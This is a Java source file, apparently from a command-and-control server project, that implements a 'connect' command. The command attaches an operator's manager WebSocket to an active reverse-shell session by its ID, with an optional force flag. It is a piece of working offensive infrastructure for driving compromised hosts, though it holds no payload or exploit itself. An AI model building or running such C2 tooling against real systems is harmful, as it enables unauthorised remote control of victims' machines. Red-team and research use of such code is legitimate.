package com.mtattab.c2cServer.service.commands.manager;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.MessageEventModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.service.ReverseShellManagerService;
import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import org.springframework.context.ApplicationEventPublisherAware;



@Component
@Slf4j
public class ConnectCommand implements Command {
    @Autowired
    ActiveSessionsObservable activeSessionsObservable;



    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        Optional<WebSocketSession> targetSessionToBeConnectedTo = SocketUtil.findSessionByIdInSessionSet(
                activeSessionsObservable.getActiveReverseShellSessions(),args.get(1));

        if (targetSessionToBeConnectedTo.isPresent()){
            connectToSession(currentSocket, targetSessionToBeConnectedTo.get(), args);
        }else {
            SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("session '%s' not found ", args.get(1)))
                    .success(false)
                    .build()
            )));


        }

    }

    private void connectToSession(WebSocketSession currentSocket, WebSocketSession socketToConnectTo, List<String> args){
        boolean forceConnect = false;
//        check if the force optional param is in the args
        if (args.size() > 2 && args.get(2) !=null && args.get(2).equalsIgnoreCase("-f") ) {
            forceConnect=true;
        }
        //        establish connection between two manger socket and reverse shell socket
        ConnectionManager.connectTwoSockets(currentSocket,socketToConnectTo, forceConnect);

    }


}
